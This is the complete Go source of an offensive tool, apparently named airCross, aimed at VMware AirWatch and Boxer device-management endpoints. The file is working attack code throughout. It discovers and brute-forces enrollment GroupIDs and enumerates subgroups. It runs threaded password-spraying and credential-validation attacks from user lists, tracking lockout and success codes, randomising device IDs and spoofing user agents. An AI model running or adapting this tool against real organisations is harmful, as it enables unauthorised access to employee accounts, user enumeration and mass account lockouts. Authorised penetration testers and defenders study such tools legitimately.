package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"regexp"
	"strconv"
	"strings"

	"crypto/rand"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"net/url"
)

type attack struct {
	agent       string
	debug       bool
	email       string
	endpoint    string
	groupID     string
	groups      map[string]int
	file        string
	method      string
	pass        string
	sid         string
	subGroup    string
	subGroupInt int
	threads     int
	rudid       bool
	udid        string
	user        string
}

// Program constants
const (
	iosAgent     = `VMwareBoxer/5199 CFNetwork/1121.2.2 Darwin/19.3.0`
	androidAgent = `Agent/20.08.0.23/Android/11`

	version = "1.0"
	tool    = "airCross"
	usage   = `
Usage:
  airCross <method> [OPTIONS] <dom/endpoint> <file>
  airCross -h | -help
  airCross -v

Global Options:
  -h, -help              Show usage
  -a                     User-Agent for request [default: Agent/20.08.0.23/Android/11]
  -t                     Application threads [default: 10]
  -u                     Airwatch username
  -p                     AirWatch password
  -d                     Enable debug output
  -r                     Disable randomize device ID
  -udid                  Device UDID value
  -dom                   Domain to Execute discovery against
  -email                 User email used for enumeration
  -gid                   AirWatch GroupID Value
  -sgid                  AirWatch sub-GroupID Value
  -sint                  AirWatch sub-GroupID INT value (Associated to multiple groups)

  <endpoint>             AirWatch endpoint FQDN
  <dom>                  Discovery domain
  <file>                 Line divided file containing GroupID or UserID values

Methods:
  gid-disco              GroupID discovery query
  gid-val                GroupID validation query
  gid-brute              GroupID brute-force enumeration
  auth-boxer             Boxer single-factor authentication attack
  auth-reg               Boxer registration single-factor authentication attack
  auth-val               AirWatch single-factor credential validation attack
  auth-gid               Boxer authentication across multi-group tenants
`
)

// newUDID generates a random UUID according to RFC 4122
func (a *attack) newUDID() {
	uuid := make([]byte, 20)
	n, err := io.ReadFull(rand.Reader, uuid)
	if n != len(uuid) || err != nil {
		fmt.Printf("[*] Error generating UDID: %v\n", err)
	}
	uuid[8] = uuid[8]&^0xc0 | 0x80
	uuid[6] = uuid[6]&^0xf0 | 0x40
	a.udid = fmt.Sprintf("%x", uuid)
}

// GroupID discovery function
func (a *attack) disco() {
	if a.groupID != "" {
		a.call("val")
	} else {
		a.call("discov1")
		if a.groupID == "" {
			a.call("discov2")
			if a.groupID == "" && a.email == "" {
				fmt.Println("[*] Registration GroupID discovery requires email to be specified")
				os.Exit(1)
			} else if a.groupID == "" {
				a.call("discov3")
			}
		}
		a.call("val")
	}
}

func (a *attack) reqSetup(api string) (*http.Client, *http.Request) {
	discoV1 := `https://discovery.awmdm.com/autodiscovery/awcredentials.aws/v1/domainlookup/domain/%s`
	discoV2 := `https://discovery.awmdm.com/autodiscovery/awcredentials.aws/v2/domainlookup/domain/%s`
	discoV3 := `https://%s/DeviceManagement/Enrollment/EmailDiscovery`
	authV1 := `https://%s/deviceservices/authenticationendpoint.aws`                                // Boxer Authentication && Registration
	authV2 := `https://%s/deviceservices/enrollment/airwatchenroll.aws/validatelogincredentials`    // AirWatch credential validation
	validateV1 := `https://%s/deviceservices/enrollment/airwatchenroll.aws/validategroupidentifier` // Pull GroupID details
	validateV2 := `https://%s/deviceservices/enrollment/airwatchenroll.aws/validategroupselector`   // Enumerate subgroups

	client := &http.Client{}
	req := &http.Request{}
	var err error

	switch api {

	// Phase 1 discovery request
	case "discov1":
		url := fmt.Sprintf(discoV1, a.endpoint)

		req, err = http.NewRequest("GET", url, nil)
		if err != nil {
			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
		}

		// Phase 2 discovery request
	case "discov2":
		url := fmt.Sprintf(discoV2, a.endpoint)

		req, err = http.NewRequest("GET", url, nil)
		if err != nil {
			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
		}

		// Pull GroupID value from HTTP request to /DeviceManagement/Enrollment/validate-userCredentials
		// GroupID value is server generated within the Response Body of the changeActivationCode()
		// or within the third 'else if' statement on the page
	case "discov3":
		// Change HTTP redirection to validate-userCredentials API Endpoint
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			if _, ok := req.URL.Query()["sid"]; ok {
				if len(req.URL.Query()["sid"]) < 1 {
					return fmt.Errorf("emailDiscovery Failed")
				}
				if req.URL.Query()["sid"][0] == "00000000-0000-0000-0000-000000000000" {
					return fmt.Errorf("emailDiscovery Disabled")
				}
			} else {
				return fmt.Errorf("emailDiscovery Failed")
			}

			req.URL.Path = "/DeviceManagement/Enrollment/validate-userCredentials"
			return nil
		}

		postData := fmt.Sprintf(`DevicePlatformId=2&EmailAddress=%s&FromGroupID=False&FromWelcome=False&Next=Next`, a.email)

		url := fmt.Sprintf(discoV3, a.endpoint)

		req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(postData)))
		if err != nil {
			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
		}

		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Add("Accept", "gzip, deflate")

	case "authv1":
		pdata := fmt.Sprintf(`{"ActivationCode":"%s","BundleId":"com.box.email","Udid":"%s","Username":"%s",`+
			`"AuthenticationType":"2","RequestingApp":"com.boxer.email","DeviceType":"2","Password":"%s",`+
			`"AuthenticationGroup":"com.air-watch.boxer"}`, a.groupID, a.udid, a.user, a.pass)

		url := fmt.Sprintf(authV1, a.endpoint)

		req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(pdata)))
		if err != nil {
			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
		}

		req.Header.Add("Content-Type", "application/json; charset=utf-8")
		req.Header.Add("Accept", "application/json; charset=utf-8")

	case "authv2":
		pdata := fmt.Sprintf(`<AWAuthenticationRequest><Username><![CDATA[%s]]></Username><Password><![CDATA[%s]]></Password>`+
			`<ActivationCode><![CDATA[%s]]></ActivationCode><BundleId><![CDATA[com.boxer.email]]></BundleId><Udid><![CDATA[%s]]>`+
			`</Udid><DeviceType>5</DeviceType><AuthenticationType>2</AuthenticationType><AuthenticationGroup><![CDATA[com.boxer.email]]>`+
			`</AuthenticationGroup></AWAuthenticationRequest>`, a.user, a.pass, a.groupID, a.udid)

		url := fmt.Sprintf(authV1, a.endpoint)

		req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(pdata)))
		if err != nil {
			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
		}

		req.Header.Add("Content-Type", "UTF-8")
		req.Header.Add("Accept", "application/json")

	case "authv3":
		jsonstr := fmt.Sprintf(`{"Username":"%s","Password":"%s","Header":{"SessionId":"%s"},`+
			`"SamlCompleteUrl":"aw:\/\/","Device":{"InternalIdentifier":"%s"}}`, a.user, a.pass, a.sid, a.udid)

		url := fmt.Sprintf(authV2, a.endpoint)

		req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(jsonstr)))
		if err != nil {
			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
		}
		req.Header.Add("Content-Type", "application/json")

	case "val", "valv1":
		jsonstr := fmt.Sprintf(`{"Header":{"SessionId":"00000000-0000-0000-0000-000000000000"},`+
			`"Device":{"InternalIdentifier":"%s"},"GroupId":"%s"}`, a.udid, a.groupID)

		url := fmt.Sprintf(validateV1, a.endpoint)

		req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(jsonstr)))
		if err != nil {
			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
		}
		req.Header.Add("Content-Type", "application/json")

	case "authv4":
		pdata := fmt.Sprintf(`{"ActivationCode":"%s","BundleId":"com.box.email","Udid":"%s","Username":"%s",`+
			`"AuthenticationType":"2","RequestingApp":"com.boxer.email","DeviceType":"2","Password":"%s",`+
			`"AuthenticationGroup":"com.air-watch.boxer"}`, a.subGroup, a.udid, a.user, a.pass)

		url := fmt.Sprintf(authV1, a.endpoint)

		req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(pdata)))
		if err != nil {
			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
		}

		req.Header.Add("Content-Type", "application/json; charset=utf-8")
		req.Header.Add("Accept", "application/json; charset=utf-8")

	case "valv2":
		jsonstr := fmt.Sprintf(`{"Header":{"SessionId":"%s"},"Device":{"InternalIdentifier":"%s"},`+
			`"GroupId":"%s","LocationGroupId":%d}`, a.sid, a.udid, a.subGroup, a.subGroupInt)

		url := fmt.Sprintf(validateV2, a.endpoint)

		req, err = http.NewRequest("POST", url, bytes.NewBuffer([]byte(jsonstr)))
		if err != nil {
			a.Fatalf("(%s-%s) Request Error (%s):  %v", a.method, api, url, err)
		}
		req.Header.Add("Content-Type", "application/json")

	default:
		a.Fatalf("%s Incorrect API Request", api)
	}

	req.Header.Add("User-Agent", a.agent)
	return client, req
}

// Function for basic web connection against Boxer API endpoint and AirWatch discovery API
// this URI destination is leveraged for both GroupID/UserID bruteforce attempts
func (a *attack) call(api string) {
	client, req := a.reqSetup(api)
	var err error

	resp, err := client.Do(req)
	if err != nil {
		a.Fatalf("%s Dial Error: %v", api, err)
	}

	defer resp.Body.Close()
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		a.Errorf("%s Unable to read response: %v", err)
	}

	if resp.StatusCode != 200 {
		a.Errorf("%s Invalid Response Code: %s - %d", api, req.URL.Hostname(), resp.StatusCode)
		return
	}
	resp.Body.Close()

	type discoV1resp struct {
		EnrollURL string `json:"EnrollmentUrl"`
		GroupID   string `json:"GroupId"`
	}

	type authV1resp struct {
		StatusCode string `json:"StatusCode"`
	}

	type header struct {
		SID string `json:"SessionId"`
	}

	type status struct {
		Code         int    `json:"Code"`
		Notification string `json:"Notification"`
	}

	type nextStep struct {
		Groups     map[string]int `json:"Groups"`
		GroupID    string         `json:"GroupId"`
		Type       int            `json:"Type"`
		GreenBox   string         `json:"GreenBoxUrl"`
		VIDMServer string         `json:"VidmServerUrl"`
		CAPTCHA    bool           `json:"IsCaptchaRequired"`
	}

	type validate struct {
		Header header   `json:"Header"`
		Status status   `json:"Status"`
		Next   nextStep `json:"NextStep"`
	}

	switch api {
	case "discov1", "discov2":
		bresp := &discoV1resp{}
		err := json.Unmarshal(bodyBytes, bresp)
		if err != nil {
			a.Errorf("%s Response Marshall Error: %v", err)
		}

		if bresp.EnrollURL != "" {
			endp, _ := url.Parse(bresp.EnrollURL)
			a.endpoint = endp.Hostname()
			a.Successf("%s: Successful Endpoint Discovery", a.endpoint)
		} else {
			a.Failf("%s - Failed GroupID Discovery", api)
		}
		if bresp.GroupID != "" {
			a.groupID = bresp.GroupID
			a.Successf("Successful GroupID Discovery")
		} else {
			a.Failf("%s - Failed GroupID Discovery", api)
		}

	case "discov3":
		re := regexp.MustCompile(`else if \('(.*?)'`)
		sub := re.FindAllStringSubmatch(string(bodyBytes), 1)
		if len(sub) < 1 || sub[0][1] == "" {
			a.Failf("Failed GroupID Discovery")
			return
		}

		a.groupID = sub[0][1]
		a.Successf("Successful GroupID Discovery")

	case "authv1", "authv2", "authv4":
		bresp := &authV1resp{}
		err := json.Unmarshal(bodyBytes, bresp)
		if err != nil {
			a.Errorf("%s Response Marshall Error: %v", api, err)
		}
		a.boxStatus(bresp.StatusCode)

	case "authv3":
		bresp := &validate{}
		err := json.Unmarshal(bodyBytes, bresp)
		if err != nil {
			a.Errorf("%s Response Marshall Error: %v", api, err)
		}
		a.valCredStatus(bresp.Status.Code, bresp.Status.Notification)

	case "val":
		bresp := &validate{}
		err := json.Unmarshal(bodyBytes, bresp)
		if err != nil {
			a.Errorf("%s Response Marshall Error: %v", api, err)
		}

		if len(bresp.Next.Groups) > 0 {
			if a.method == "gid-disco" {
				a.Infof("Endpoint %s contains %d groups", a.endpoint, len(bresp.Next.Groups))
				a.Infof("Run gid-val method for full listing")
			}
			if a.method == "gid-val" {
				fmt.Printf("[*] Endpoint %s contains %d groups\n", a.endpoint, len(bresp.Next.Groups))
				for key, val := range bresp.Next.Groups {
					a.subGroup = key
					a.subGroupInt = val
					a.Successf("SubGroup Discovery")
				}
			}
		}

		if a.method == "gid-val" || a.method == "gid-disco" {
			a.valStatus(bresp.Next.Type)
			if a.debug {
				a.Debugf("Group Body: %s", string(bodyBytes))
			}
		}

	case "valv1":
		bresp := &validate{}
		err := json.Unmarshal(bodyBytes, bresp)
		if err != nil {
			a.Errorf("%s Response Marshall Error: %v", api, err)
		}
		a.groups = bresp.Next.Groups
		a.sid = bresp.Header.SID

	case "valv2":
		bresp := &validate{}
		err := json.Unmarshal(bodyBytes, bresp)
		if err != nil {
			a.Errorf("%s Response Marshall Error: %v", api, err)
		}
		a.sid = bresp.Header.SID
		a.subGroup = bresp.Next.GroupID
	}
}

// Threaded requests against API methods
func (a *attack) brute() {
	var file []byte

	if a.file == "" {
		file = []byte("")
	} else {
		f, err := os.Open(a.file)
		if err != nil {
			a.Fatalf("File open Failure: %s - %v", a.file, err)
		}
		defer f.Close()

		file, _ = ioutil.ReadAll(f)
		f.Close()
	}

	lines := len(strings.Split(string(file), "\n"))
	thread := make(chan bool, lines)
	buff := make(chan bool, a.threads)

	a.Infof("%s threading %d values across %d threads", a.method, lines, a.threads)
	for _, line := range strings.Split(string(file), "\n") {
		if lines > 1 && line == "" {
			thread <- true
			continue
		}
		if a.rudid {
			a.newUDID()
		}

		buff <- true
		go func(a attack, val string) {
			switch a.method {
			case "gid-brute":
				if val != "" {
					a.groupID = val
				}
				a.call("authv1")

			case "auth-boxer":
				if val != "" {
					a.user = val
				}
				a.call("authv1")

			case "auth-reg":
				if val != "" {
					a.user = val
				}
				a.call("authv2")

			case "auth-val":
				if val != "" {
					a.user = val
				}
				a.call("valv1")
				if len(a.groups) > 0 {
					a.call("valv2")
				}
				a.call("authv3")
			}

			<-buff
			thread <- true
		}(*a, line)
	}

	close(buff)
	for i := 0; i < lines; i++ {
		<-thread
	}
	close(thread)
}

func (a *attack) thread() {
	thread := make(chan bool, len(a.groups))
	buff := make(chan bool, a.threads)

	a.call("valv1")
	a.Infof("%s threading %d values across %d threads", a.method, len(a.groups), a.threads)

	if len(a.groups) < 1 {
		thread <- true
		a.brute()
	} else {
		for key, val := range a.groups {
			if a.rudid {
				a.newUDID()
			}

			buff <- true
			go func(a attack, key string, val int) {
				a.subGroup = key
				a.subGroupInt = val
				a.call("valv2")
				a.call("authv4")

				<-buff
				thread <- true
			}(*a, key, val)

		}

		close(buff)
		for i := 0; i < len(a.groups); i++ {
			<-thread
		}
		close(thread)
	}
}

// Identified validatelogincredentials values
func (a *attack) valCredStatus(code int, status string) {
	switch code {
	case 1:
		a.Successf("Authentication Successful - Code: %d: %s", code, status)
	case 2:
		a.Failf("Authentication Failure - Code: %d: %s", code, status)
		// if strings.Contains(status, "Invalid User Credentials") {
		// 	a.Successf("Account Validation - Code: %d: %s", code, status)
		// }
	default:
		a.Errorf("Unknown Response - Code: %d: %s", code, status)
	}
}

// Identified validategroupidentifier values
func (a *attack) valStatus(code int) {
	switch code {
	case 1:
		a.Failf("Registration Disabled - Code: %d", code)
	case 2:
		a.Successf("AirWatch Single-Factor Registration - Code: %d", code)
	case 4:
		a.Successf("Single-Factor Registration - Code: %d", code)
	case 8:
		a.Successf("Token Registration - Code: %d", code)
	case 18:
		a.Successf("SAML Registration - Code: %d", code)
	default:
		a.Errorf("Unknown Registration - Code: %d", code)
	}
}

// Identified AirWatch Boxer API endpoint response codes
func (a *attack) boxStatus(code string) {
	if code != "AUTH--1" && (a.method == "gid-brute" || a.method == "gid-disco") {
		a.Successf("Valid GroupID")
	}
	switch code {
	case "AUTH--1":
		a.Failf("Invalid GroupID - %s", code)
	case "AUTH-1001":
		a.Failf("Authentication Failure - %s", code)
	case "AUTH-1002":
		a.Failf("Account Lockout - %s", code)
	case "AUTH-1003":
		a.Failf("Account Disabled - %s", code)
	case "AUTH-1006":
		a.Successf("Authentication Successful - %s", code)
	default:
		a.Errorf("Unknown Response - %s", code)
	}
}

func (a *attack) preString() string {
	val := ""
	if a.user != "" {
		val += a.user
	}
	if a.pass != "" {
		val += ":" + a.pass
	}
	if a.user != "" || a.pass != "" {
		val += "@"
	}
	if a.groupID != "" {
		val += a.groupID
	}
	if a.subGroup != "" || a.subGroupInt != 0 {
		val += "[" + a.subGroup + ":" + strconv.Itoa(a.subGroupInt) + "]: "
	} else if val != "" {
		val += ": "
	}
	return val
}

func (a *attack) Successf(data string, v ...interface{}) {
	l := log.New(os.Stdout, "", 0)
	l.Printf("[+] "+a.preString()+data+"\n", v...)
}

func (a *attack) Failf(data string, v ...interface{}) {
	l := log.New(os.Stdout, "", 0)
	l.Printf("[-] "+a.preString()+data+"\n", v...)
}

func (a *attack) Infof(data string, v ...interface{}) {
	l := log.New(os.Stdout, "", 0)
	l.Printf("[*] "+data+"\n", v...)
}

func (a *attack) Errorf(data string, v ...interface{}) {
	l := log.New(os.Stderr, "", 0)
	l.Printf("[ERROR] "+data+"\n", v...)
}

func (a *attack) Fatalf(data string, v ...interface{}) {
	l := log.New(os.Stderr, "", 0)
	l.Printf("[FATAL] "+data+"\n", v...)
	os.Exit(1)
}

func (a *attack) Debugf(data string, v ...interface{}) {
	l := log.New(os.Stdout, "", 0)
	l.Printf("[DEBUG] "+data+"\n", v...)
}

func main() {
	// Global program variable definitions
	var (
		attack = &attack{
			endpoint: os.Args[len(os.Args)-2],
			file:     os.Args[len(os.Args)-1],
			method:   os.Args[1],
			sid:      `00000000-0000-0000-0000-000000000000`,
		}
		flAgent   = flag.String("a", "Agent/20.08.0.23/Android/11", "")
		flDebug   = flag.Bool("d", false, "")
		flEmail   = flag.String("email", "", "")
		flGID     = flag.String("gid", "", "")
		flSubGInt = flag.Int("sint", 0, "")
		flSubGID  = flag.String("sgid", "", "")
		flPass    = flag.String("p", "", "")
		flThread  = flag.Int("t", 10, "")
		flRUDID   = flag.Bool("r", true, "")
		flUDID    = flag.String("udid", "", "")
		flUser    = flag.String("u", "", "")
		flVersion = flag.Bool("v", false, "")
	)

	// Flag parsing
	flag.Usage = func() {
		fmt.Println(usage)
	}
	if !strings.HasPrefix(os.Args[1], "-") {
		os.Args = os.Args[1:]
	}

	flag.Parse()
	if *flVersion {
		fmt.Printf("version: %s\n", version)
		os.Exit(0)
	}

	attack.agent = *flAgent
	attack.debug = *flDebug
	attack.email = *flEmail
	attack.groupID = *flGID
	attack.subGroupInt = *flSubGInt
	attack.subGroup = *flSubGID
	attack.pass = *flPass
	attack.threads = *flThread
	attack.rudid = *flRUDID
	attack.udid = *flUDID
	attack.user = *flUser

	if attack.method == "" {
		fmt.Println(usage)
		attack.Infof("Select attack")
	}

	if !attack.rudid && attack.udid == "" {
		attack.Fatalf("40-digit UDID must be provided if randomization is disabled")
	}

	switch attack.method {
	case "gid-disco":
		if attack.endpoint == "" && (attack.email == "" || attack.user == "" || attack.pass == "") {
			attack.Fatalf("Missing required options for GroupID enumeration")
		}
		attack.disco()

	case "gid-val":
		if (attack.endpoint == "" || attack.groupID == "") && (attack.groupID == "" || attack.subGroup == "" || attack.subGroupInt == 0) {
			attack.Fatalf("%s requires valid Endpoint/GroupID or GroupID/SubGroup/SubGroupINT", attack.method)
		}
		if attack.subGroupInt > 0 {
			attack.call("valv1")
			attack.call("valv2")
			attack.Successf("SubGroupID Enumerated")
		} else {
			attack.call("val")
		}

	case "gid-brute":
		if attack.endpoint == "" || attack.user == "" || attack.pass == "" {
			attack.Fatalf("%s requires valid Endpoint/User/Pass values", attack.method)
		}
		attack.brute()

	case "auth-boxer", "auth-reg":
		if (attack.endpoint == "" || attack.groupID == "" || attack.pass == "") && (attack.file == "" && attack.user == "") {
			attack.Fatalf("%s requires valid Endpoint/GroupID/Pass values", attack.method)
		}
		attack.brute()

	case "auth-val":
		if attack.endpoint == "" || attack.groupID == "" || attack.pass == "" {
			attack.Fatalf("%s requires valid Endpoint/GroupID/Pass values", attack.method)
		}
		if attack.subGroup != "" && attack.subGroupInt != 0 {
			attack.brute()
		} else {
			attack.call("valv1")
			if len(attack.groups) < 1 {
				attack.brute()
			} else {
				for key, val := range attack.groups {
					attack.subGroupInt = val
					attack.subGroup = key
					attack.brute()
				}
			}
		}

	case "auth-gid":
		if attack.endpoint == "" || attack.groupID == "" || attack.user == "" || attack.pass == "" {
			attack.Fatalf("Brute %s requires valid Endpoint/GroupID/User/Pass values", attack.method)
		}
		attack.thread()

	default:
		fmt.Printf("[*] Invalid attack provided %s\n", attack.method)
		os.Exit(1)
	}
}
